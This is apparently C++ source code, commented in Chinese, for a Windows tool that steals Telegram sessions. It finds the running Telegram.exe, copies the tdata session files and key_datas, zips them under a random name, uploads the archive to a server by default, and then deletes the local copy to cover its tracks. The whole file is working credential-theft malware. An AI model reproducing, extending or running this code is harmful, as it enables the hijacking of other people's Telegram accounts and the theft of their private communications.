#define _CRT_SECURE_NO_WARNINGS
#include "clipp.h"
#include <WinSock2.h>              //头文件
#pragma comment(lib,"ws2_32.lib")    //库文件
#include "client.h"
#include "ZipFunction.h"
#include "FileFunction.h"
#include <stdlib.h>
#include <atlstr.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <tchar.h>
#include <psapi.h>
#include <typeinfo>
#include <iostream>
#include <vector>
#include <random>
#include <io.h>
#include <direct.h>
#include <fstream>


using std::cout;
using std::string;
using namespace std;
using namespace clipp;


/*
    根据进程标识获取进程信息
*/
std::string ProcessIdToName(DWORD processId)
{
    std::string ret;
    HANDLE handle = OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE,
        processId //进程标识
    );
    if (handle)
    {
        DWORD buffSize = 1024;
        CHAR buffer[1024];
        if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
        {
            ret = buffer;
        }
        CloseHandle(handle);
    }
    return ret;
}

/*
    #获取tdata里需要压缩的文件,并压缩
*/
std::string GetZipFiles(std::string tdataPath, std::string destinationPathOwn) {

    std::string exeFilePath;
    if (destinationPathOwn == "") {
        //获取当前exe文件目录
        exeFilePath = GetExeFilePath();
    }else {
        exeFilePath = destinationPathOwn + "\\";
    }
    vector<string> fileNames;
    string path(tdataPath); 	//tdata目录绝对路径 D:\AppSoftware\Telegram Desktop\Telegram1\tdata

    //创建压缩目录
    std::string zipFilePath = exeFilePath + GetRandomFileName(8);
    CreateFolder(zipFilePath);

    GetFileNames(path, fileNames);
    for (const auto& ph : fileNames) {
        std::string result;
        std::string newFile;
        string::size_type pos;

        pos = ph.rfind("\\");
        result = ph.substr(pos + 1);
        if (size(result) == 17) {
            cout << ph << endl;
            newFile = zipFilePath + "\\" + result;
            CopyFiles((char*)ph.data(), (char*)newFile.data());
        }
        else if (size(result) == 16) {  
            //创建文件夹
            CreateFolder(zipFilePath +"\\" + result);
            //cout << zipFilePath + "\\" + result << endl;

            //获取文件夹里的文件
            vector<string> folder_fileNames;
            string folder_path(ph);
            GetFileNames(folder_path, folder_fileNames);
            for (const auto& folder_ph : folder_fileNames) {
                std::string folder_result;
                string::size_type folder_pos;
                folder_pos = folder_ph.rfind("\\");
                folder_result = folder_ph.substr(folder_pos + 1);
                if (folder_result == "." || folder_result == "..") {
                    continue;
                }
                else {
                    cout << folder_ph << endl;
                    newFile = zipFilePath + "\\" + result + "\\" + folder_result;
                    CopyFiles((char*)folder_ph.data(), (char*)newFile.data());
                }
            }
        }
        else if (result == "key_datas") {
            cout << ph << endl;
            newFile = zipFilePath + "\\" + "key_datas";
            CopyFiles((char*)ph.data(), (char*)newFile.data());
        }
        else {
            continue;
        }
    }
    return zipFilePath;
}

int main(int argc, char** argv)
{
    std::string sourcePath;
    std::string destinationPath;
    /*
        命令行参数解析
    */
    std::string processNameOwn = "Telegram.exe"; //默认为Telegram.exe
    std::string sourcePathOwn;
    std::string destinationPathOwn;
    std::string isUpload;

    auto cli = (
        option("-pn", "-PN", "--ProcessName") & value("ProcessName", processNameOwn),
        option("-sp", "-SP", "--SourcePath") & value("SourcePath", sourcePathOwn),
        option("-dp", "-DP", "--DestinationPath") & value("DestinationPath", destinationPathOwn),
        option("-iu", "-IU", "--IsUpload") & value("IsUpload", isUpload)
        );
    if (parse(argc, const_cast<char**>(argv), cli)) {
        //std::cout << "ProcessName: " << processNameOwn << "\n";
    }
    else {
        std::cerr << make_man_page(cli, argv[0]) << std::endl;
    }
    /*
        不根据进程打包
    */
    if (processNameOwn == "Telegram.exe" && sourcePathOwn != "") {
        cout << "no process!!!!!!" << endl;
        sourcePath = GetZipFiles(sourcePathOwn, destinationPathOwn);
        destinationPath = sourcePath + ".zip";

        //压缩到指定目录
        CompressDirToZip(sourcePath.data(), destinationPath.data());
        //输出目的路径
        cout << "压缩文件路径为: " << destinationPath << endl;

        //获取zip压缩过程中的错误信息并输出
        std::cout << GetZipErrorMessage(0);
        //删除文件夹
        DeleteDirectory((char*)sourcePath.data());
        if(isUpload == "off") {
            //中断程序运行
            std::exit(0);
        }else{ 
            //上传zip到服务器
            ClientSocketUpload((char*)destinationPath.data());
            // 删除zip文件
            DeleteFiles((char*)destinationPath.data());
        }
        std::exit(0);
    }


    /*根据进程打包*/
    unsigned int i;
    std::string ret;
    string::size_type pos;
    std::string processName;
    std::string tdataPath;
    DWORD aProcesses[1024], cbNeeded, cProcesses;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }


    // 计算有多少个进程标识(数量)
    cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++)
    {
        //aProcesses[i]进程标识
        if (aProcesses[i] != 0)
        {
            ret = ProcessIdToName(aProcesses[i]);
            //cout << ret << endl;
            pos = ret.rfind("\\");
            //进程名 ret.substr(pos + 1)
            processName = ret.substr(pos + 1);
            if (processName == processNameOwn){
                //判断命令行参数sp
                if (sourcePathOwn == "") {
                    //进程文件路径 ret.substr(0,pos1+1)
                    tdataPath = ret.substr(0, pos + 1) + "tdata";
                }else {
                    tdataPath = sourcePathOwn;
                }
                //输出tdata路径
                cout << "tdata文件路径为: " << tdataPath << endl;
                
                //判断命令行参数dp
                if (destinationPathOwn == "") {
                    sourcePath = GetZipFiles(tdataPath,"");
                    destinationPath = sourcePath + ".zip";
                }
                else {
                    sourcePath = GetZipFiles(tdataPath, destinationPathOwn);
                    destinationPath = sourcePath + ".zip";
                }

                
                //压缩到指定目录
                CompressDirToZip(sourcePath.data(), destinationPath.data());
                //输出目的路径
                cout << "生成文件路径为: " << destinationPath << endl;

                //获取zip压缩过程中的错误信息并输出
                std::cout << GetZipErrorMessage(0);
                //删除文件夹
                DeleteDirectory((char*)sourcePath.data());
                if (isUpload == "off") {
                    //中断程序运行
                    std::exit(0);
                }
                else {
                    //上传zip到服务器
                    ClientSocketUpload((char*)destinationPath.data());
                    // 删除zip文件
                    DeleteFiles((char*)destinationPath.data());
                }
            }
        }
    }
    return 0;
}